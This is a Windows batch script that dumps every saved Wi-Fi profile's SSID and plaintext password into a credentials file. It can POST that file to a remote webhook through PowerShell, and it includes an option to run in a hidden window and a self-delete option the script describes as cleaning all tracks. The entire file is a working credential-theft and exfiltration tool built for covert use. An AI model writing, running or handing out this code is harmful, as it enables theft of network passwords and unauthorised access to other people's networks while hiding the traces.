::@mode 15,1
::@powershell -window Hidden -command ""   &:: Uncomment if you want to run the program in hidden mode
@Echo off
:: Change the current encoding to print special characters
powershell -c "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8"

:: Default values. Change them to whatever you want!
set selfdelete=0
set upload=0
set "credsfile=creds.txt"
set "webhook="
::

:: Arguments
if "%~1"=="--upload" if "%~2" neq "" (
	set "webhook=%~2"
	set upload=1
)

if "%~1"=="--output" if "%~2" neq "" (
	set "credsfile=%~2"
	set upload=0
)

:: Prepare environment for xml files
del %credsfile% 2>nul
rmdir /s /q "%temp%\profiles" 2>nul
mkdir "%temp%\profiles" 2>nul
pushd "%temp%\profiles"

:: Prepare the str2hex.vbs file
call :init
netsh wlan export profile key=clear >nul

:Repeat
	:: Get the name of last enumerated xml file
	set "file="
	for /f "delims=:" %%i in ('dir /b *.xml 2^>nul') do (set file=%%i)
	if "%file%"=="" (goto endRepeat)
	:: Convert file value to hex, then rename the file with that name (to avoid special chars causing the program to crash)
	set "_file=%file%"
	for /f %%a in ('cscript //nologo str2hex.vbs "%file%"') do (set "file=%%a")
	rename "%_file%" %file% 2>&1 >nul

	:: Get name
	set "name="
	for /f "skip=1 tokens=*" %%j in ('findstr /c:"<name>" "%file%"') do (set name=%%j)
	set "name=%name:<name>=%"
	set "name=%name:</name>=%"
	:: Avoid program crash with names that contain "&" character
	set "name=%name:&=^&%"

	:: Convert name to hex
	set "name_hex="
	for /f "tokens=*" %%j in ('findstr /c:"<hex>" "%file%"') do (set name_hex=%%j)
	set "name_hex=%name_hex:<hex>=%"
	set "name_hex=%name_hex:</hex>=%"

	:: Get password
	set "key="
	for /f "tokens=*" %%j in ('findstr /c:"<keyMaterial>" "%file%"') do (set key=%%j)
	if "%key%"=="" (set "key=none")
	set "key=%key:<keyMaterial>=%"
	set "key=%key:</keyMaterial>=%"
	:: Avoid program crash with passwords that contain "&" character
	set "key=%key:&=^&%"

	:: Convert key to hex
	for /f %%a in ('cscript //nologo str2hex.vbs "%key%"') do (set "key_hex=%%a")
	
	del "%file%" 2>nul

	echo.
	echo [!] SSID: %name%
	echo [+] Password: %key%

	:: Fix a weird echo problem
	setlocal EnableDelayedExpansion
	echo [^^!] SSID: !name!>>%credsfile%
	endlocal
	echo [+] Password: %key%>> %credsfile%
	echo [!] Hex pair: %name_hex%3a%key_hex%>> %credsfile%
	:: Hex pairs are added as a precaution in case the SSIDs/Passwords contain special chars and to preserve the original values
	echo.>> %credsfile%
goto Repeat
:endRepeat

:::: Cleanup
popd

:: Send credsfile to webhook
if %upload%==1 (
	powershell -c "Invoke-RestMethod -Uri '%webhook%' -Method POST -Body (Get-Content -Raw -Path '%temp%\profiles\%credsfile%') -ContentType 'text/plain'" >nul
	del %credsfile% 2>nul
)

:: The program will delete itself (+ clean all tracks!) if enabled
if %selfdelete%==1 (
	rmdir /s /q "%temp%\profiles" 2>nul &:: Very important!
	del "%~f0" 2>nul
)

move "%temp%\profiles\%credsfile%" "%cd%" 2>&1 >nul
rmdir /s /q "%temp%\profiles" 2>nul
exit /b


:init
	:: Prepare str2hex.vbs script to be used for string conversion to hex
	:: Note: It's faster to use a vbs script to convert to hex than a powershell command ;)
	(echo inputString = WScript.Arguments^(0^)
	 echo hexString = ""
	 echo For i = 1 To Len^(inputString^)
	 echo     hexValue = Hex^(Asc^(Mid^(inputString, i, 1^)^)^)
	 echo     hexString = hexString ^& hexValue
	 echo Next
	 echo WScript.Echo hexString)>str2hex.vbs
Exit /b